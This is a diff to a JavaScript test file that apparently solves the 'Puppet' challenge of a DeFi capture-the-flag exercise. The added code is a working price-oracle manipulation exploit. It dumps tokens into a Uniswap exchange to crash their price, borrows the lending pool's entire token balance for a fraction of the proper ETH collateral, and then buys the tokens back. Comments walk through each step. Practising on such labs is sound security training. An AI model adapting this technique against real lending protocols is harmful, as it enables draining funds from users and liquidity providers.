@@ -102,7 +102,62 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+       //The lending pool is computing the eth needed as collateral to borrow tokens from it, to any user that might request them,
+       //using the Uniswap exchange contract for the pair (DVT tokens/ Eth). Main observation here is that this exchange has a ratio 1:1 
+       // on both tokens and eth, and us as an attacker , we are in possession of bigger amounts of both. 
+       //We can use this advantage to move the exchange in our favor. Firstly, by selling our tokens in the exchange for eth,
+       //increading the amount of tokens but devaluating a lot its price per unit. 
+       //Afterwards, we can request the pool to borrow tokens and the calculation of the Eth needed will favor us, 
+       //as it will be 100x cheaper aproximately. 
+       //Finally, we can recover our 1000 DVT tokens sold to the exchange using the eth remaining, both reestablishing initial
+       //exchange conditions and having more DVT tokens than the pool to pass through the last test. 
+
+       //Needed to set a higher gas limit to avoid tx reversion. (no reason --> gas issue)
+       const ethBought = await this.uniswapExchange.connect(attacker).getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,
+        {
+            gasLimit: 100000
+        });
+        console.log("Eth that can be bought in exchange of attacker's token amount (1000 DVT)", ethers.utils.formatEther(ethBought))
+        
+        console.log("Attacker approves Uniswap echange to use/spend his DVT tokens")
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        
+        //Minimum 9 Eth, as the amount resulted in 9,9 Eth / deadline 
+        console.log("Attacker sells his DVT tokens/ get Eth in return")
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+        ATTACKER_INITIAL_TOKEN_BALANCE, 
+        ethers.utils.parseEther("9"), 
+        (await ethers.provider.getBlock("latest")).timestamp * 2)
+
+        console.log("Balance of Uniswap exchange (Eth)",  ethers.utils.formatEther((await ethers.provider.getBalance(this.uniswapExchange.address))))
+        console.log("Balance of Uniswap exchange (DVT tokens)",  ethers.utils.formatEther((await this.token.balanceOf(this.uniswapExchange.address))))
+        console.log("Balance of attacker (Eth)",  ethers.utils.formatEther((await ethers.provider.getBalance(attacker.address))))
+        console.log("Balance of attacker (DVT tokens)",  ethers.utils.formatEther((await this.token.balanceOf(attacker.address))))
+        console.log("-------------------------------------------------------------")
+        
+        const depositRequired = await this.lendingPool.connect(attacker).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log("Eth needed as collateral to take all DVT tokens from pool", ethers.utils.formatEther(depositRequired))
+        
+        console.log("Attacker borrows all DVT tokens from lending pool")
+        //Sending 20Eth, remaining eth is returned from inside borrow function 
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther("20")})
+        console.log("Pool total token balance after borrowing become: ", 
+        (await this.token.balanceOf(this.lendingPool.address)).toString())
+        console.log("-------------------------------------------------------------")
+        
+        console.log("Attacker wants to recover his 1000 DVT tokens from exchange")
+        const ethSold = await this.uniswapExchange.connect(attacker).getEthToTokenOutputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,
+            {
+                gasLimit: 100000
+            });
+        console.log("Eth to pay to recover attacker initial 1000 DVT tokens", ethers.utils.formatEther(ethSold))
+        await this.uniswapExchange.connect(attacker).ethToTokenSwapOutput(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            (await ethers.provider.getBlock("latest")).timestamp * 2,
+            {value: ethSold}
+        )
+        console.log("Final balance of attacker (DVT tokens)",  ethers.utils.formatEther((await this.token.balanceOf(attacker.address))))
+        console.log("Final balance of attacker (Eth)",  ethers.utils.formatEther((await ethers.provider.getBalance(attacker.address))))
     });
 
     after(async function () {
